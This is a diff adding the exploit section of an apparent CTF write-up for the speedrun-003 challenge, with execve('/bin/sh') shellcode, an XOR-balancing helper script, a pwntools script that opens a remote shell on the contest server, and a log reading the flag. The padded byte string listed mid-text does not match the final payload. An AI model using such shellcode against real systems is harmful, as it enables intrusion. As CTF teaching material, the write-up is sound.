@@ -111,4 +111,71 @@ Then, we compare `v1` to the result of xoring the last `15` bytes of our buffer 
 
 So essentially in our shellcode we need the first `15` bytes xor'd together to equal the last `15` bytes xor'd together.
 
+## Exploit
+
+So our shellcode, as described earlier, needs to have the first `15` bytes xor'd together to equal the last `15` bytes xor'd together.
+
+We are going to do a `execve(/bin/sh)` shellcode.
+
+The easiest solution is to take a shellcode that is less than `30` bytes long, and take our 2nd half of our shellcode and add bytes to it, ensuring the xor of the 2 halves equal one another. 
+
+We can do this because in our shellcode, the last bytes will be a `syscall`, so it doesn't matter what bytes come after.
+
+This [shellcode](https://www.exploit-db.com/exploits/42179) calls `execve(/bin/sh)` using `24` bytes, which is perfect.
+
+The shellcode is:
+
+```
+\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05
+```
+
+Now, we need to ensure the xor of the 2 halves equal one another, so I wrote a simple python script to calculate that xor result:
+
+```
+XD = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f"
+finale = 0
+for x in XD:
+    finale  = finale ^ ord(x)
+
+print finale
+```
+
+We run it on our first half of our shellcode because we cannot change this. We get the xor'd result to be `0xcd`.
+
+Since our shellcode is `24` bytes long, we need to add `6` more bytes to the 2nd half of our shellcode and make the xor'd result be `0xcd`.
+
+Through an arbitrary process and elimination (I didn't script this, you could), I came up with the following for the 2nd half of our shellcode:
+
+```
+\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05\x05\x50\x50\x50\x50\x50\x5f
+```
+
+You can rerun the script above and replace our string with this 2nd half and you should get `0xcd` as a result.
+
+So our exploit is done, lets write our final python script and bring it all together:
+
+```
+from pwn import *
+
+r = remote("speedrun-003.quals2019.oooverflow.io", 31337)
+r.recvuntil("Send me your drift")
+
+shellcode = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05\x50\x50\x50\x50\x50\x5f"
+
+r.sendline(shellcode)
+r.interactive()
+```
+
+Running it:
+
+```
+vagrant@kali:/vagrant/misc$ python speedrun3.py
+[+] Opening connection to speedrun-003.quals2019.oooverflow.io on port 31337: Done
+[*] Switching to interactive mode
+
+$ cat /flag
+OOO{Fifty percent of something is better than a hundred percent of nothing. (except when it comes to pwning)}
+```
+
+**Flag**: `OOO{Fifty percent of something is better than a hundred percent of nothing. (except when it comes to pwning)}`
 
